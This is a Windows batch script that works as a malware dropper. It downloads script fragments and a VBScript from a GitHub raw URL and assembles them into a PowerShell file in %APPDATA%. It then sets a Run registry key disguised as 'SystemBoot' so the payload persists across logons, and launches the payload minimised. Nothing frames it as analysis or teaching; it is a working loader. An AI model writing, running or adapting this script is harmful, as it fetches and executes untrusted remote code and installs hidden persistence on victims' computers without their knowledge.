@echo off
setlocal EnableDelayedExpansion

:: Define variables
set "d=%APPDATA%\Paged"
set "f=%d%\M.txt"
set "a=%d%\f1.txt"
set "b=%d%\f2.txt"
set "c=%d%\Nvs.ps1"
set "v=%d%\S_m.vbs"
set "u=raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V"
set "dynLink=https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/TEMP/special.txt"

:: Remove and recreate directory
rmdir /s /q "%d%" 2>nul
mkdir "%d%" || (echo Failed to create directory %d% & exit /b 1)

:: Download files and perform replacements in memory
powershell -c "try { $contentM = (Invoke-WebRequest -Uri 'https://%u%/Final.txt' -ErrorAction Stop).Content; $contentA = (Invoke-WebRequest -Uri 'https://%u%/First.txt' -ErrorAction Stop).Content; $contentB = (Invoke-WebRequest -Uri '%dynLink%' -ErrorAction Stop).Content; $finalContent = $contentM -replace '----',$contentA -replace '====',$contentB; [System.IO.File]::WriteAllText('%c%', $finalContent) } catch { Write-Error $_.Exception.Message; exit 1 }" || (echo PowerShell command failed & exit /b 1)

:: Wait briefly to ensure file writing completes
timeout /t 5 /nobreak >nul

:: Download S_m.vbs and save
powershell -c "try { $content = (Invoke-WebRequest -Uri 'https://%u%/S_m.vbs' -ErrorAction Stop).Content; [System.IO.File]::WriteAllText('%v%', $content) } catch { Write-Error $_.Exception.Message; exit 1 }" || (echo Failed to download and save S_m.vbs & exit /b 1)

:: Set registry key for persistence
powershell -c "try { Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemBoot' -Value 'wscript.exe \"%v%\"' -ErrorAction Stop } catch { Write-Error $_.Exception.Message; exit 1 }" || (echo Failed to set registry key & exit /b 1)

:: Launch VBScript
start /min wscript "%v%" || (echo Failed to start VBScript & exit /b 1)

endlocal
exit /b 0
